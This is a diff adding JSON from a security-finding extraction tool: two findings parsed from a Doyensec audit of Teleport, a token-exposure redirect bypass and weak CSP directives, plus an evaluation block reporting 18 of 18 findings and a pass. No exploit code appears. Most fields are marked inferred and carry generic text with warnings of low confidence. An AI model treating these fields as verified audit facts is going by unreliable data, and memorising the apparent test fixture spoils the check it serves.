+      "slug": "token-exposure-through-redirect-bypass-in-aap-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Token Exposure Through Redirect Bypass In AAP",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Token Exposure Through Redirect Bypass In AAP affecting investigation-scope; extractor found type Secret Exposure. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-17 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.413Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Token Exposure Through Redirect Bypass In AAP",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Token Exposure Through Redirect Bypass In AAP affecting investigation-scope; extractor found type Secret Exposure. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-17 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "token exposure through redirect bypass in aap",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-17|token exposure through redirect bypass in aap|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Token Exposure Through Redirect Bypass In AAP",
+        "sourceText": "TEL-Q420-17 Token Exposure Through Open Redirect Bypass In AAP",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    },
+    {
+      "id": "F-doyensec-018",
+      "slug": "weak-content-security-policy-directives-investigation-scope",
+      "reportId": "G-doyensec-teleport-q42020",
+      "reportName": "doyensec-teleport-q42020",
+      "title": "Weak Content-Security-Policy Directives",
+      "cve": "—",
+      "severity": "Medium",
+      "asset": "investigation-scope",
+      "score": 64,
+      "status": "In Review",
+      "detectedAt": "2026-06-05T23:28:36.470Z",
+      "summary": "Weak Content-Security-Policy Directives affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+      "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+      "evidence": "Finding IDs: TEL-Q420-18 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+      "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest.",
+      "history": [
+        {
+          "atIso": "2026-06-05T23:28:44.414Z",
+          "status": "In Review",
+          "note": "Finding generated from the high-recall catalog fallback. Detailed body section was not confidently detected. Warnings: Finding generated from bounded report catalog; review detailed body before training"
+        }
+      ],
+      "reported": {
+        "title": "Weak Content-Security-Policy Directives",
+        "severity": "Medium",
+        "asset": "investigation-scope",
+        "status": "In Review",
+        "summary": "Weak Content-Security-Policy Directives affecting investigation-scope; extractor found security indicators from the submitted report. Warning: Finding generated from bounded report catalog; review detailed body before training",
+        "impact": "Potential impact includes increased attacker opportunity against investigation-scope if this signal is not reviewed.",
+        "evidence": "Finding IDs: TEL-Q420-18 | Warnings: Finding generated from bounded report catalog; review detailed body before training",
+        "remediation": "Review the detailed report body for the original recommendation, then validate and remediate the affected control with a targeted retest."
+      },
+      "normalization": {
+        "normalizedTitle": "weak content-security-policy directives",
+        "normalizedAsset": "investigation-scope",
+        "canonicalKey": "TEL-Q420-18|weak content security policy directives|investigation-scope||||||"
+      },
+      "provenance": {
+        "extractionMethod": "nlp-hybrid",
+        "parserConfidence": 78,
+        "sourceSectionTitle": "Weak Content-Security-Policy Directives",
+        "sourceText": "TEL-Q420-18 Weak Content-Security-Policy Directives",
+        "sourceSpans": [],
+        "fieldSources": {
+          "title": "reported",
+          "severity": "inferred",
+          "asset": "inferred",
+          "status": "inferred",
+          "summary": "derived",
+          "impact": "inferred",
+          "evidence": "reported",
+          "remediation": "inferred"
+        }
+      }
+    }
+  ],
+  "eval": {
+    "enableNlp": true,
+    "expectedCount": 18,
+    "actualCount": 18,
+    "actualSeverityCounts": {
+      "Critical": 0,
+      "High": 0,
+      "Medium": 18,
+      "Low": 0
+    },
+    "duplicates": 0,
+    "negativeHits": 0,
+    "pass": true
+  }
+}
